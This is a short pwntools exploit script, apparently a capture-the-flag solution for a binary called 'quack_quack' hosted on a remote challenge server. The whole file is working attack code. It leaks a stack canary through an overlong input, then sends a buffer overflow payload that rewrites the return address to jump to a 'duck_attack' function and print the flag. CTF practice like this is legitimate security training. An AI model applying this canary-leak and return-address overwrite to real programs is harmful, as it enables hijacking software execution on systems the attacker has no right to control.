from pwn import *

context.binary = binary = ELF('./quack_quack',checksec=False)

p = process()
p = remote('83.136.251.145',43410)

payload1 = b'a'*0x59+b'Quack Quack '
p.sendlineafter(b'> ', payload1)
p.recvuntil(b'Quack Quack ')

canary = u64(b'\x00'+p.recv(7))
info(f'canary: {hex(canary)}')

payload2 = b'a'*0x58
payload2 += p64(canary)
payload2 += b'b'*8
payload2 += p64(binary.symbols.duck_attack)

p.sendline(payload2)
p.recvuntil(b'Did you really expect to win a fight against a Duck?!\n\n')


success(f'flag: {p.recvline().decode()}')
